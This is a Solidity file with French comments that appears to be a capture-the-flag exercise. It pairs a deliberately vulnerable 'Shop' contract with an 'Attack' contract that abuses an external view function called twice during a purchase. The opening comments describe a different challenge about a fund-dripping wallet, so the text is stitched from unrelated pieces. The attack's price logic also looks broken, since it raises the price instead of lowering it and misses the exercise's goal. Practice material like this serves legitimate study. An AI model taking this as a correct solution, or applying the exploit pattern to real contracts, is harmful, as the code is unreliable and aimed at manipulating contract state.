// Il s'agit d'un portefeuille simple qui verse des fonds au fil du temps.
// Vous pouvez retirer les fonds progressivement en devenant un partenaire de retrait.

// Choses qui pourraient aider :
// Shops'attend à être utilisé à partir d'unBuyer
// Comprendre les restrictions des fonctions d'affichage
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
    function price() external view returns (uint256);
}

contract Shop {
    uint256 public price = 100;
    bool public isSold;

    function buy() public {
        Buyer _buyer = Buyer(msg.sender);

        if (_buyer.price() >= price && !isSold) {
            isSold = true;
            price = _buyer.price();
        }
    }
}

contract Attack is Buyer {
    Shop shop;

    constructor(address _shop) {
        shop = Shop(_shop);
    }

    function price() external view returns (uint256) {
        return shop.price() + 1;
    }

    function attack() public {
        shop.buy();
    }
}
